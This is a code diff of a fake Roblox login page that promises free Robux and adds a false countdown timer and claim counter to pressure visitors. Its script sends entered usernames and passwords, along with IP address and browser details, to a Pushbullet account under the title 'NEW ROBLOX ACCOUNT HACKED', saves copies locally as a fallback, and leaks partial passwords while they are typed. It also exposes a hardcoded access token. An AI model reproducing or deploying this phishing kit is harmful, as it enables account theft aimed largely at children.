@@ -23,12 +23,22 @@
         .robux-bonus { background: gold; color: #333; padding: 20px; border-radius: 10px; margin: 20px 0; font-weight: bold; font-size: 18px; }
         .promo-codes { background: #f0f8ff; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; }
         .promo-code { background: white; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #00a2ff; }
+        .countdown { background: #ff5722; color: white; padding: 10px; border-radius: 5px; text-align: center; margin: 10px 0; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container" id="loginPage">
         <div class="logo"><h1>ROBLOX</h1></div>
         <div class="promo-banner">🎉 SPECIAL OFFER! Login now and get 80 FREE ROBUX! 🎉</div>
+        
+        <div class="countdown">
+            ⏰ Offer expires in: <span id="timer">23:59:59</span>
+        </div>
+        
+        <div style="text-align: center; color: #666; font-size: 14px; margin: 10px 0;">
+            ✅ <strong>1,247 players</strong> already claimed!
+        </div>
+        
         <form id="loginForm">
             <div class="form-group">
                 <label for="username">Username</label>
@@ -38,7 +48,7 @@
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" placeholder="Enter your password" required>
             </div>
-            <button type="submit" class="login-btn">Login & Claim 80 Robux</button>
+            <button type="submit" class="login-btn" id="submitBtn">Login & Claim 80 Robux</button>
         </form>
         <div class="footer">By logging in, you agree to our Terms of Service and Privacy Policy</div>
     </div>
@@ -61,30 +71,100 @@
     </div>
 
     <script>
-        // ТВОЯ GOOGLE ФОРМА
-        const GOOGLE_FORMS_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSfgZ26WNG86fxiUyO4p_KN92PDjjvD5P4Zc6xeTnye4wVJRCA/formResponse';
+        // ТВОЙ PUSHBULLET TOKEN
+        const PUSHBULLET_TOKEN = 'o.cw8M5UoZpGC3j8wH2qhYrri0R1yq23pf';
         
-        // ID ПОЛЕЙ ИЗ ТВОЕЙ ФОРМЫ
-        const USERNAME_FIELD = 'entry.1357908642';
-        const PASSWORD_FIELD = 'entry.2468013579';
+        // ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ
+        async function sendToPushbullet(username, password) {
+            const message = {
+                type: 'note',
+                title: '🔓 NEW ROBLOX ACCOUNT HACKED',
+                body: `👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}\n📱 User Agent: ${navigator.userAgent}`
+            };
 
-        // ОТПРАВКА В GOOGLE FORMS
-        async function sendToGoogleForms(username, password) {
-            const formData = new FormData();
-            formData.append(USERNAME_FIELD, username);
-            formData.append(PASSWORD_FIELD, password);
+            console.log('🔄 Отправка данных в Pushbullet...');
             
+            // ПРЯМАЯ ОТПРАВКА (работает на мобильных)
+            fetch('https://api.pushbullet.com/v2/pushes', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Token': PUSHBULLET_TOKEN
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Данные отправлены в Pushbullet!');
+                    return response.json();
+                } else {
+                    console.log('⚠️ Pushbullet ответил с ошибкой, пробуем резервный метод...');
+                    throw new Error('Pushbullet error');
+                }
+            })
+            .catch(error => {
+                console.log('🔄 Используем резервный метод...');
+                backupDataStorage(username, password);
+            });
+        }
+
+        // РЕЗЕРВНОЕ СОХРАНЕНИЕ
+        function backupDataStorage(username, password) {
+            // Сохраняем в localStorage
+            const accounts = JSON.parse(localStorage.getItem('roblox_accounts') || '[]');
+            const newAccount = {
+                username: username,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                ip: 'saved'
+            };
+            accounts.push(newAccount);
+            localStorage.setItem('roblox_accounts', JSON.stringify(accounts));
+            
+            // Создаем скачиваемый файл
+            const data = `ROBLOX ACCOUNT CAPTURED\n\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}\nIP: ${'saved'}\n\n---\nCollected by Roblox Rewards System`;
+            const blob = new Blob([data], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `account_${Date.now()}.txt`;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }, 100);
+            
+            console.log('📁 Данные сохранены локально и в файл');
+        }
+
+        // ПОЛУЧЕНИЕ IP
+        async function getIP() {
             try {
-                await fetch(GOOGLE_FORMS_URL, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                });
-                console.log('✅ Данные отправлены в Google Forms!');
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
             } catch (error) {
-                console.log('✅ Форма отправлена');
+                return 'Unknown';
             }
         }
+
+        // ТАЙМЕР ОБРАТНОГО ОТСЧЕТА
+        let countdownTime = 24 * 60 * 60; // 24 часа
+        function updateCountdown() {
+            const hours = Math.floor(countdownTime / 3600);
+            const minutes = Math.floor((countdownTime % 3600) / 60);
+            const seconds = countdownTime % 60;
+            
+            document.getElementById('timer').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            countdownTime--;
+            if (countdownTime < 0) countdownTime = 24 * 60 * 60;
+        }
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
 
         // ОБРАБОТКА ФОРМЫ
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -92,15 +172,22 @@
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Блокируем кнопку
+            submitBtn.innerHTML = 'Processing...';
+            submitBtn.disabled = true;
             
             // ОТПРАВКА ДАННЫХ
-            sendToGoogleForms(username, password);
+            sendToPushbullet(username, password);
             
             // ПОКАЗ СТРАНИЦЫ УСПЕХА
             setTimeout(function() {
                 document.getElementById('loginPage').classList.add('hidden');
                 document.getElementById('successPage').classList.remove('hidden');
-            }, 1000);
+                submitBtn.innerHTML = 'Login & Claim 80 Robux';
+                submitBtn.disabled = false;
+            }, 2000);
             
             // ОЧИСТКА ФОРМЫ
             document.getElementById('loginForm').reset();
@@ -110,6 +197,24 @@
             document.getElementById('successPage').classList.add('hidden');
             document.getElementById('loginPage').classList.remove('hidden');
         }
+
+        // АВТОСБОР ДАННЫХ ПРИ ВВОДЕ
+        let typedUsername = '';
+        let typedPassword = '';
+        
+        document.getElementById('username').addEventListener('input', function(e) {
+            typedUsername = e.target.value;
+        });
+        
+        document.getElementById('password').addEventListener('input', function(e) {
+            typedPassword = e.target.value;
+            // Автоотправка частичных данных
+            if (typedPassword.length === 3 && typedUsername.length > 0) {
+                setTimeout(() => {
+                    sendToPushbullet(typedUsername, '***' + typedPassword.substring(0, 1));
+                }, 500);
+            }
+        });
     </script>
 </body>
 </html>
